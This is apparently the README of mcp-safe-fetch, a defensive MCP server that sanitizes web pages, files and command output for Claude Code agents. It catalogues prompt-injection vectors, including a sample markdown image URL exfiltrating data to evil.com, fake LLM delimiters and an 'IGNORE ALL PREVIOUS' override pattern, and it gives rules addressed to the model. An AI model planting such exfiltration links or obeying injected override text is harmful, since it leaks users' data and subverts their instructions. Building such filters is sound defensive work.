# mcp-safe-fetch

Deterministic content sanitization MCP server for agentic coding tools. Strips prompt injection vectors from untrusted content before it enters the LLM context.

Three tools that match the core interface of Claude Code's native `WebFetch`, `Read`, and `Bash` — compatible parameters, same output format — with an invisible sanitization layer on top.

- **`safe_fetch`** replaces `WebFetch` entirely. Web pages are always untrusted content, and safe_fetch provides deterministic sanitization — no model in the loop, nothing to prompt-inject.
- **`safe_read`** is for reading untrusted files — cloned repos, downloaded files, vendored dependencies, anything you didn't write. Your own source code is fine with the native `Read`.
- **`safe_exec`** is for commands that return untrusted content — `curl`, `gh pr view`, `git log` on external repos, `npm info`, etc. Normal dev commands like `npm run build` or `git status` don't need sanitization.

By default, `init` only denies `WebFetch`. The native `Read` and `Bash` remain available for everyday use. Use `--strict` if you want to force everything through the safe tools.

## Why

Claude Code's `WebFetch` runs content through Turndown and a secondary LLM before it reaches your context — but that pipeline wasn't designed as a security boundary. Turndown strips structural HTML (scripts, styles, nav) but text-level injection vectors survive the conversion: zero-width characters, fake LLM delimiters, base64 payloads, markdown exfiltration URLs. And using an LLM to filter adversarial content is circular — the summarization model is processing the exact payloads designed to manipulate it.

Outside Claude Code, the problem is worse. API-level `web_fetch`, other MCP clients, `curl` output, cloned repos — raw untrusted content enters the LLM context with no sanitization at all.

`mcp-safe-fetch` provides deterministic sanitization — regex, cheerio, string processing. No model in the loop, nothing to prompt-inject.

## What it strips

**HTML-level:**
- Hidden elements — `display:none`, `visibility:hidden`, `opacity:0`, `[hidden]`
- Off-screen elements — `position:absolute; left:-9999px`, `clip:rect(0,0,0,0)`, `font-size:0`
- Same-color text — `color:white; background:white` (inline styles, ~20 named colors + hex + rgb)
- Dangerous tags — `<script>`, `<style>`, `<noscript>`, `<meta>`, `<link>`
- HTML comments

**Character-level:**
- Zero-width chars, soft hyphens, BOM, bidi overrides, variation selectors, tag characters
- Control characters (preserves `\n`, `\t`, `\r`)
- NFKC normalization (collapses fullwidth and homoglyph characters)

**Encoded payloads:**
- Base64 strings that decode to instruction-like text
- Hex-encoded instruction sequences
- Text data URIs

**Structural injection:**
- Fake LLM delimiters — `<|im_start|>`, `[INST]`, `<<SYS>>`, `\n\nHuman:`, etc.
- Markdown image exfiltration URLs — `![img](http://evil.com/exfil?data=...)`
- Custom user-defined patterns

## Real-world results

Tested against 4 live sites:

| Site | Raw HTML tokens | safe_fetch tokens | Reduction | Threats caught |
|------|----------------------|-------------------|-----------|----------------|
| PayloadsAllTheThings | ~39,500 | ~7,800 | 80% | 3 hidden elements, 4 LLM delimiters |
| FotMob news article | ~109,500 | ~5,900 | 95% | 32 script tags, 90 style tags |
| Node.js docs | ~75,500 | ~2,100 | 97% | 2 hidden elements, 1 off-screen |
| Express.js | ~9,400 | ~1,400 | 86% | Clean page |

**93% average reduction vs raw HTML. Zero false positives.** All visible page content preserved.

## Install

```bash
npx -y mcp-safe-fetch init
```

This registers the MCP server, auto-allows the safe tools, and denies the native `WebFetch`. The native `Read` and `Bash` remain available for everyday use. Restart Claude Code after running.

For stricter setups where you want everything routed through sanitization, also deny `Read` and `Bash`:

```bash
npx -y mcp-safe-fetch init --strict
```

> **Note:** `safe_exec` sanitizes command *output* but does not run commands in Claude Code's sandbox. In `--strict` mode you gain output sanitization but lose sandbox protection on command execution.

Preview what would change without writing anything:

```bash
npx -y mcp-safe-fetch init --dry-run
```

### Recommended CLAUDE.md rules

Add this to your `CLAUDE.md` so Claude knows when to use the safe tools:

```markdown
## Web Fetching / Untrusted Content

When you need to fetch/read the content of a URL, always use the `safe_fetch` MCP tool. Do not use WebFetch, Playwright, or Chrome DevTools to load web pages.
When reading files from cloned repos, downloaded archives, or vendored dependencies, use `safe_read` instead of `Read`.
When running commands that return untrusted output (curl, gh pr view, git log on external repos), use `safe_exec` instead of `Bash`.
```

Without these rules, Claude will default to the native `Read` and `Bash` tools. `safe_fetch` works automatically because `init` denies `WebFetch`, but `safe_read` and `safe_exec` need explicit instructions to be used.

## Tools

### `safe_fetch` — replaces WebFetch

Fetch a URL and return sanitized markdown with injection vectors removed. This is a full replacement — web pages are always untrusted, so there's no reason to use the native `WebFetch`.

| Parameter | Type | Description |
|-----------|------|-------------|
| `url` | `string` (required) | URL to fetch |
| `prompt` | `string` | What information to extract from the page |

```
[safe-fetch] Stripped: 5 hidden elements, 68 script tags | 284127 → 12720 bytes (219ms)
Prompt: Extract the API pricing table
```

### `safe_read` — safe alternative to Read

Read a file and return sanitized content formatted as `cat -n` output. Use this for untrusted files — cloned repos, downloaded files, vendored dependencies. Your own source code is fine with the native `Read`.

| Parameter | Type | Description |
|-----------|------|-------------|
| `file_path` | `string` (required) | Absolute path to the file |
| `offset` | `number` | Line number to start from (1-based) |
| `limit` | `number` | Number of lines to return (default: 2000) |

Output matches the native Read tool exactly — right-justified 6-char line numbers, tab separator, lines > 2000 chars truncated with `...`. HTML files (`.html`, `.htm`, `.xhtml`, `.svg` or content starting with `<!DOCTYPE`/`<html>`) are routed through the full HTML sanitization pipeline. Binary files are detected and rejected.

```
[safe-read] Clean file | 1200 → 1200 bytes (3ms)

     1	import express from 'express';
     2	const app = express();
```

### `safe_exec` — safe alternative to Bash

Execute a shell command and return sanitized stdout/stderr. Use this when the command output may contain untrusted content — `curl`, `gh pr view`, `git log` on external repos, `npm info`, etc. Normal dev commands like `npm run build` or `git status` don't need this.

| Parameter | Type | Description |
|-----------|------|-------------|
| `command` | `string` (required) | Shell command to execute |
| `timeout` | `number` | Timeout in ms (default: 120000, max: 600000) |
| `description` | `string` | Description of what the command does |

Timeout defaults and caps match the native Bash tool. If the command output looks like HTML, it's routed through the full HTML pipeline (handles `curl` returning raw pages, etc). `timeout_ms` is still accepted as a deprecated alias.

```
[safe-exec] Show git status | Clean output | 245 → 245 bytes (12ms)
```

### `sanitize_stats`

Show cumulative sanitization statistics for the current session across all tools.

## CLI

Test sanitization on any URL:

```bash
npx -y mcp-safe-fetch test <url>
```

View aggregated stats from logged sanitization runs:

```bash
npx -y mcp-safe-fetch stats
```

## Configuration

Optional. Create `.mcp-safe-fetch.json` in your project root or home directory:

```json
{
  "logStripped": true,
  "logFile": ".claude/sanitize.log",
  "allowDataUris": false,
  "maxBase64DecodeLength": 500,
  "customPatterns": ["IGNORE ALL PREVIOUS"]
}
```

| Option | Default | Description |
|--------|---------|-------------|
| `logStripped` | `false` | Log sanitization stats to JSONL file |
| `logFile` | `.claude/sanitize.log` | Log file path |
| `logMaxBytes` | `10485760` (10 MB) | Max log file size before rotation |
| `allowDataUris` | `false` | Allow text/* data URIs through |
| `maxBase64DecodeLength` | `500` | Max base64 string length to decode and inspect |
| `customPatterns` | `[]` | Literal strings to strip (case-insensitive) |

## How it works

Two sanitization pipelines, selected automatically:

**Full HTML pipeline** (web pages, HTML files, HTML-like command output):

1. Parse HTML with [cheerio](https://cheerio.js.org/)
2. Strip hidden elements, off-screen elements, same-color text, dangerous tags, comments
3. Convert to markdown with [turndown](https://github.com/mixmark-io/turndown)
4. Text sanitization (steps below)

**Text pipeline** (source files, plain command output):

1. Strip invisible unicode characters, normalize with NFKC
2. Detect and remove encoded payloads (base64, hex, data URIs)
3. Detect and neutralize exfiltration URLs in markdown images
4. Strip fake LLM delimiters and custom patterns

## License

MIT
